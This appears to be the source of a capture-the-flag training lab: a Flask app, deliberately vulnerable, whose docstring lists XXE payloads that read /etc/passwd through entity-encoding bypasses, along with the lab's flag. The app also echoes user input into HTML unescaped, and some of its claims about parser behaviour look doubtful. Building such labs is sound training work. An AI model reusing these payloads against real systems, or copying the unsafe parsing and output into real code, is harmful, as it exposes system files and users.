"""
XXE Lab 19: XXE HTML Entities Bypass
Difficulty: 4 (Expert)
Points: 150

Description:
XXE bypassing via HTML entity encoding and mixed content.
"""

from flask import Flask, request
import xml.etree.ElementTree as ET

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    """
    VULNERABLE: XXE with HTML entity encoding bypass
    
    Attack Vector:
    Bypass filters by HTML entity encoding:
    
    <?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ELEMENT foo ANY>
        <!ENTITY &#x25;xxe SYSTEM "file:///etc/passwd">
        <!ENTITY % test "<!ENTITY &#x26;#x25;xxe SYSTEM 'file:///etc/passwd'>">
        %test;
    ]>
    
    Or partial encoding:
    <!EN&#x54;ITY xxe SYSTEM "file:///etc/passwd">
    
    Or mixed:
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file&#x3a;///etc/passwd">]>
    
    Flag: FLAG{xxe_html_entities_019}
    """
    xml_input = request.form.get('xml', '')
    result = None
    error = None
    
    if xml_input:
        try:
            # VULNERABLE: Direct parsing without XXE prevention
            # HTML entities are auto-decoded by parser
            root = ET.fromstring(xml_input)
            result = ET.tostring(root, encoding='unicode')
        except Exception as e:
            error = str(e)
    
    return f"""
    <html>
    <body>
        <h1>XXE HTML Entities Bypass</h1>
        <form method="POST">
            <textarea name="xml" rows="10" cols="60">{xml_input}</textarea>
            <button>Parse</button>
        </form>
        {f"<pre>{result}</pre>" if result else ""}
        {f"<p style='color:red;'>{error}</p>" if error else ""}
        <hr>
        <h3>Hint:</h3>
        <p>Try encoding special characters in DOCTYPE using HTML entities</p>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5019, debug=False)
